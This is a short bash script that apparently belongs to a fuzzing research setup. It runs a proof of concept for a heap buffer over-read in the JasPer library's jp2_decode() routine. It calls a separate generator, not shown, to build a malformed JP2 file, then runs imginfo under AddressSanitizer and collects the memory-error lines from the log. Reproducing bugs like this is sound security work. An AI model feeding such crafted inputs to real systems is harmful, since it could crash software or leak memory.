#!/usr/bin/env bash
# PoC runner for VULN 002: Heap Buffer Over-read in jp2_decode() BPCC bpcs Array
# CWE-125: Out-of-bounds Read

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/jasper/src_libjasper_jp2_jp2_dec_c"
IMGINFO="/data/ylwang/non-textfuzz/target/jasper/build_test/install/bin/imginfo"
INPUT="${POC_DIR}/vuln_002.jp2"
RESULT="${POC_DIR}/vuln_002_result.txt"
ASAN_LOG="${POC_DIR}/asan.log"

echo "=== Step 1: Generate PoC JP2 file ===" | tee "${RESULT}"
python3 "${POC_DIR}/vuln_002_gen.py" | tee -a "${RESULT}"

echo "" >> "${RESULT}"
echo "=== Step 2: Run imginfo with ASAN ===" >> "${RESULT}"
ASAN_OPTIONS="abort_on_error=0:log_path=${ASAN_LOG}" \
  "${IMGINFO}" -f "${INPUT}" \
  >> "${RESULT}" 2>&1 || true

echo "" >> "${RESULT}"
echo "=== Step 3: ASAN/UBSAN output ===" >> "${RESULT}"
cat "${ASAN_LOG}".* 2>/dev/null \
  | grep -E "(ERROR|WARNING|SUMMARY|heap-buffer-overflow|READ|stack-buffer|global-buffer|use-after-free|runtime error)" \
  >> "${RESULT}" || true

echo "Done. Results in: ${RESULT}"
